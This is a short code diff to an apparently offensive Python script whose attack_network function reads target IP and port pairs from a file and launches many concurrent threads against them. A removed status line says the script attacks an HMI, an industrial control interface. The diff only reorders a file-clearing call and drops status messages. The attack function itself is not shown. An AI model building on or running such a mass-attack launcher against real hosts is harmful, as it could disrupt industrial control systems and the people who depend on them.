@@ -38,13 +38,11 @@ def read_from_file():
     return l
 
 def attack_network():
-    print("[+] Start attacking HMI...")
+    clear_file()
     for (ip, port) in read_from_file():
         while threading.active_count() > 400:
             pass
         print(f"Start attack --> {ip}:{port}")
         threading.Thread(target=attack, args=[ip, port]).start()
-    clear_file()
-    print("[+] attacking done")
 
 attack_network()
